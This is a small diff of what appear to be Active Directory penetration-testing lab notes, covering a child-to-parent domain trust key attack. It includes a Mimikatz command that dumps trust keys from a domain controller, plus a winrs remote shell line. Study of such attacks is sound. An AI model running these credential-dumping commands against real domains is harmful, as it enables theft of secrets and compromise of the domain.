@@ -318,16 +318,8 @@ winrs -r:dcorp-mgmt cmd.exe
 	- krbtgt hash of the child
 	- Trust tickets
 
-#### Trust Key Attack
+#### Child to Parent - Trust Key Attack
 
-
-#### Krbtgt Attack
- 
-
-
----
-### Trust Key Abuse
-#### Attack
 __Look for Trust Key__
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
